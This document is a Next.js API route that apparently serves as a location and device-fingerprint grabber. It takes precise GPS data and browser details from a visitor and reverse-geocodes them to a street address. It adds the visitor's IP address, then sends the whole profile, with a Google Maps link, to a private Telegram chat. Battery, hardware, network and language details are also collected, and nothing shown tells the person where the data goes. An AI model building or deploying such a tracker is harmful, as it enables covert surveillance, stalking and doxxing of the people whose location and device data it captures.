import { NextRequest, NextResponse } from "next/server";

function parseDevice(ua: string): string {
  if (/iPhone/.test(ua)) return "iPhone";
  if (/iPad/.test(ua)) return "iPad";
  if (/Samsung/.test(ua)) return "Samsung";
  if (/Pixel/.test(ua)) return "Pixel";
  if (/Huawei/i.test(ua)) return "Huawei";
  if (/Android/.test(ua)) return "Android Device";
  if (/Macintosh/.test(ua)) return "Mac";
  if (/Windows/.test(ua)) return "Windows PC";
  if (/Linux/.test(ua)) return "Linux PC";
  return "Unknown Device";
}

function parseBrowser(ua: string): string {
  if (/CriOS|Chrome\//.test(ua) && !/Edg/.test(ua)) return "Chrome";
  if (/Safari\//.test(ua) && !/Chrome/.test(ua)) return "Safari";
  if (/Firefox|FxiOS/.test(ua)) return "Firefox";
  if (/Edg/.test(ua)) return "Edge";
  if (/OPR|Opera/.test(ua)) return "Opera";
  return "Unknown Browser";
}

function parseOS(ua: string): string {
  const m = ua.match(/\(([^)]+)\)/);
  if (!m) return "Unknown OS";
  const info = m[1];
  if (/iPhone OS ([\d_]+)/.test(info)) return `iOS ${info.match(/iPhone OS ([\d_]+)/)?.[1]?.replace(/_/g, ".")}`;
  if (/Android ([\d.]+)/.test(info)) return `Android ${info.match(/Android ([\d.]+)/)?.[1]}`;
  if (/Mac OS X ([\d._]+)/.test(info)) return `macOS ${info.match(/Mac OS X ([\d._]+)/)?.[1]?.replace(/_/g, ".")}`;
  if (/Windows NT ([\d.]+)/.test(info)) return `Windows NT ${info.match(/Windows NT ([\d.]+)/)?.[1]}`;
  if (/Linux/.test(info)) return "Linux";
  return info;
}

async function reverseGeocode(lat: number, lng: number) {
  try {
    const res = await fetch(
      `https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lng}&addressdetails=1&zoom=18`,
      { headers: { "User-Agent": "Mozilla/5.0" } }
    );
    if (!res.ok) return null;
    return await res.json();
  } catch {
    return null;
  }
}

export async function POST(req: NextRequest) {
  const body = await req.json();
  const {
    latitude, longitude, accuracy,
    altitude, altitudeAccuracy, heading, speed,
    timestamp, browserInfo = {},
  } = body;

  const token = process.env.TG_BOT_TOKEN;
  const chatId = process.env.TG_CHAT_ID;

  if (!token || !chatId) {
    return NextResponse.json({ error: "missing config" }, { status: 500 });
  }

  const ua = browserInfo.userAgent || "";
  const device = parseDevice(ua);
  const browser = parseBrowser(ua);
  const os = parseOS(ua);
  const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;

  const geo = await reverseGeocode(latitude, longitude);
  const addr = geo?.address || {};

  const locationParts = [
    addr.road,
    addr.house_number ? `#${addr.house_number}` : null,
    addr.neighbourhood || addr.suburb,
    addr.city || addr.town || addr.village,
    addr.state,
    addr.postcode,
    addr.country,
  ].filter(Boolean);

  const ip = req.headers.get("x-forwarded-for")?.split(",")[0]?.trim()
    || req.headers.get("x-real-ip")
    || "unknown";

  const lines: string[] = [
    `📍 *${device}* shared their location`,
    ``,
    `*📌 Address*`,
    locationParts.length > 0 ? locationParts.join(", ") : "Could not resolve address",
    ``,
    `*🗺 Coordinates*`,
    `Lat: \`${latitude}\``,
    `Lng: \`${longitude}\``,
    `Accuracy: \`${Math.round(accuracy)}m\``,
  ];

  if (altitude != null) lines.push(`Altitude: \`${Math.round(altitude)}m\``);
  if (altitudeAccuracy != null) lines.push(`Alt Accuracy: \`${Math.round(altitudeAccuracy)}m\``);
  if (heading != null) lines.push(`Heading: \`${heading}°\``);
  if (speed != null) lines.push(`Speed: \`${speed} m/s\``);
  if (timestamp) lines.push(`Timestamp: \`${new Date(timestamp).toISOString()}\``);

  lines.push(``);
  lines.push(`*📱 Device & Browser*`);
  lines.push(`Device: \`${device}\``);
  lines.push(`Browser: \`${browser}\``);
  lines.push(`OS: \`${os}\``);
  lines.push(`Platform: \`${browserInfo.platform || "unknown"}\``);
  lines.push(`Vendor: \`${browserInfo.vendor || "unknown"}\``);

  lines.push(``);
  lines.push(`*🖥 Screen*`);
  lines.push(`Screen: \`${browserInfo.screenWidth}x${browserInfo.screenHeight}\``);
  lines.push(`Window: \`${browserInfo.windowWidth}x${browserInfo.windowHeight}\``);
  lines.push(`Pixel Ratio: \`${browserInfo.devicePixelRatio}\``);
  lines.push(`Color Depth: \`${browserInfo.screenColorDepth}\``);

  lines.push(``);
  lines.push(`*🌐 Network & System*`);
  lines.push(`IP: \`${ip}\``);
  lines.push(`Online: \`${browserInfo.online}\``);
  if (browserInfo.connectionType) lines.push(`Connection: \`${browserInfo.connectionType}\``);
  if (browserInfo.downlink) lines.push(`Downlink: \`${browserInfo.downlink} Mbps\``);
  if (browserInfo.rtt) lines.push(`RTT: \`${browserInfo.rtt}ms\``);
  if (browserInfo.saveData) lines.push(`Data Saver: \`${browserInfo.saveData}\``);

  lines.push(``);
  lines.push(`*⚙️ Other*`);
  lines.push(`Language: \`${browserInfo.language}\``);
  if (browserInfo.languages) lines.push(`Languages: \`${browserInfo.languages}\``);
  lines.push(`Timezone: \`${browserInfo.timezone}\``);
  lines.push(`UTC Offset: \`${browserInfo.timezoneOffset}min\``);
  lines.push(`Cookies: \`${browserInfo.cookiesEnabled}\``);
  lines.push(`DNT: \`${browserInfo.doNotTrack || "unset"}\``);
  lines.push(`Cores: \`${browserInfo.hardwareConcurrency}\``);
  lines.push(`RAM: \`${browserInfo.deviceMemory}\``);
  lines.push(`Touch Points: \`${browserInfo.maxTouchPoints}\``);
  lines.push(`Referrer: \`${browserInfo.referrer || "direct"}\``);
  if (browserInfo.batteryLevel) lines.push(`Battery: \`${browserInfo.batteryLevel}\``);
  if (browserInfo.batteryCharging) lines.push(`Charging: \`${browserInfo.batteryCharging}\``);

  lines.push(``);
  lines.push(`[📍 View on Google Maps](${mapsLink})`);

  const text = lines.join("\n");

  await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: chatId,
      text,
      parse_mode: "Markdown",
      disable_web_page_preview: false,
    }),
  });

  return NextResponse.json({ ok: true });
}
